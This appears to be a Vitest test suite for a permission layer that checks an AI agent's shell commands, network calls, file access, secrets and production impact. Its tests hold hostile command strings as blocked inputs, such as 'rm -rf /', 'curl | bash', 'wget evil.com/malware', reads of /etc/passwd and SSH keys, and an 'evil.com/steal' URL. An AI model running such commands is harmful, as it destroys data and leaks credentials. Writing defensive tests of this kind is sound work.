import { describe, it, expect } from "vitest";
import {
  isShellAllowed,
  isNetworkAllowed,
  isFileReadAllowed,
  isFileWriteAllowed,
  containsSecrets,
  affectsProduction,
  validateToolAction,
} from "../allowlists";

describe("isShellAllowed", () => {
  it("allows whitelisted commands", () => {
    expect(isShellAllowed("ls").allowed).toBe(true);
    expect(isShellAllowed("pwd").allowed).toBe(true);
    expect(isShellAllowed("git status").allowed).toBe(true);
    expect(isShellAllowed("git diff").allowed).toBe(true);
    expect(isShellAllowed("npm test").allowed).toBe(true);
    expect(isShellAllowed("cat README.md").allowed).toBe(true);
  });

  it("blocks dangerous commands", () => {
    expect(isShellAllowed("rm -rf /").allowed).toBe(false);
    expect(isShellAllowed("sudo apt install").allowed).toBe(false);
    expect(isShellAllowed("chmod 777 file").allowed).toBe(false);
    expect(isShellAllowed("curl | bash").allowed).toBe(false);
  });

  it("blocks path traversal", () => {
    expect(isShellAllowed("cat ../../../etc/passwd").allowed).toBe(false);
  });

  it("blocks access to system directories", () => {
    expect(isShellAllowed("cat /etc/passwd").allowed).toBe(false);
    expect(isShellAllowed("ls /var/log").allowed).toBe(false);
    expect(isShellAllowed("cat /usr/bin/node").allowed).toBe(false);
  });

  it("blocks unknown commands", () => {
    expect(isShellAllowed("wget evil.com/malware").allowed).toBe(false);
    expect(isShellAllowed("curl https://evil.com").allowed).toBe(false);
  });

  it("blocklist takes priority over allowlist", () => {
    // "rm -rf" is in blocklist but "rm" starts with no allowlist entry
    expect(isShellAllowed("rm -rf node_modules").allowed).toBe(false);
  });
});

describe("isNetworkAllowed", () => {
  it("allows whitelisted domains", () => {
    expect(isNetworkAllowed("https://github.com/user/repo").allowed).toBe(true);
    expect(isNetworkAllowed("https://api.openai.com/v1/chat").allowed).toBe(true);
    expect(isNetworkAllowed("https://api.anthropic.com/v1/messages").allowed).toBe(true);
    expect(isNetworkAllowed("https://docs.convex.dev/tutorial").allowed).toBe(true);
  });

  it("allows subdomains of whitelisted domains", () => {
    // The network allowlist checks if hostname ends with `.domain` — both subdomains match
    expect(isNetworkAllowed("https://raw.github.com/file").allowed).toBe(true);
    expect(isNetworkAllowed("https://api.github.com/repos").allowed).toBe(true);
  });

  it("blocks unknown domains", () => {
    expect(isNetworkAllowed("https://evil.com/steal").allowed).toBe(false);
    expect(isNetworkAllowed("https://malware.org/dl").allowed).toBe(false);
  });

  it("rejects invalid URLs", () => {
    expect(isNetworkAllowed("not-a-url").allowed).toBe(false);
    expect(isNetworkAllowed("").allowed).toBe(false);
  });
});

describe("isFileReadAllowed", () => {
  it("allows reading from whitelisted paths", () => {
    expect(isFileReadAllowed("src/index.ts").allowed).toBe(true);
    expect(isFileReadAllowed("docs/PRD.md").allowed).toBe(true);
    expect(isFileReadAllowed("package.json").allowed).toBe(true);
    expect(isFileReadAllowed("scripts/setup.sh").allowed).toBe(true);
  });

  it("blocks reading from non-whitelisted paths", () => {
    expect(isFileReadAllowed("/etc/passwd").allowed).toBe(false);
    expect(isFileReadAllowed("/root/.ssh/id_rsa").allowed).toBe(false);
  });
});

describe("isFileWriteAllowed", () => {
  it("allows writing to whitelisted paths", () => {
    expect(isFileWriteAllowed("workspace/output/result.md").allowed).toBe(true);
    expect(isFileWriteAllowed("src/utils.ts").allowed).toBe(true);
    expect(isFileWriteAllowed("docs/notes.md").allowed).toBe(true);
  });

  it("blocks writing to blocked paths", () => {
    expect(isFileWriteAllowed(".env").allowed).toBe(false);
    expect(isFileWriteAllowed(".env.local").allowed).toBe(false);
    expect(isFileWriteAllowed("node_modules/pkg/index.js").allowed).toBe(false);
    expect(isFileWriteAllowed("workspace/config/secrets.json").allowed).toBe(false);
  });

  it("blocklist takes priority over allowlist", () => {
    // workspace/config is blocked even though workspace/** might match write
    expect(isFileWriteAllowed("workspace/config/test.json").allowed).toBe(false);
  });
});

describe("containsSecrets", () => {
  it("detects API keys", () => {
    expect(containsSecrets("api_key=abc123")).toBe(true);
    expect(containsSecrets("my api-key is here")).toBe(true);
    expect(containsSecrets("OPENAI_API_KEY=sk-1234")).toBe(true);
  });

  it("detects tokens", () => {
    expect(containsSecrets("token=xyz")).toBe(true);
    expect(containsSecrets("Bearer abc123")).toBe(true);
  });

  it("detects passwords", () => {
    expect(containsSecrets("password=secret")).toBe(true);
  });

  it("detects OpenAI secret keys", () => {
    expect(containsSecrets("sk-" + "a".repeat(32))).toBe(true);
  });

  it("detects GitHub tokens", () => {
    expect(containsSecrets("ghp_" + "a".repeat(36))).toBe(true);
  });

  it("returns false for safe content", () => {
    expect(containsSecrets("hello world")).toBe(false);
    expect(containsSecrets("function add(a, b) { return a + b; }")).toBe(false);
  });
});

describe("affectsProduction", () => {
  it("detects production references", () => {
    expect(affectsProduction("deploy to production")).toBe(true);
    expect(affectsProduction("prod environment")).toBe(true);
    expect(affectsProduction("live server")).toBe(true);
  });

  it("detects main/master branch references", () => {
    expect(affectsProduction("push to main")).toBe(true);
    expect(affectsProduction("merge to master")).toBe(true);
  });

  it("returns false for safe content", () => {
    expect(affectsProduction("development environment")).toBe(false);
    expect(affectsProduction("staging server")).toBe(false);
  });
});

describe("validateToolAction", () => {
  it("validates shell commands", () => {
    const safe = validateToolAction("shell_exec", { command: "git status" });
    expect(safe.allowed).toBe(true);

    const dangerous = validateToolAction("shell_exec", { command: "rm -rf /" });
    expect(dangerous.allowed).toBe(false);
  });

  it("validates network calls", () => {
    const safe = validateToolAction("network_call", { url: "https://github.com/api" });
    expect(safe.allowed).toBe(true);

    const blocked = validateToolAction("network_call", { url: "https://evil.com" });
    expect(blocked.allowed).toBe(false);
  });

  it("flags secrets in params", () => {
    const result = validateToolAction("write_file", {
      path: "src/config.ts",
      content: "const api_key = 'secret123'",
    });
    expect(result.requiresApproval).toBe(true);
    expect(result.approvalReasons).toContain("Action involves secrets");
  });

  it("flags production impact", () => {
    const result = validateToolAction("shell_exec", {
      command: "git push",
      target: "production",
    });
    expect(result.requiresApproval).toBe(true);
    expect(result.approvalReasons).toContain("Action affects production");
  });
});
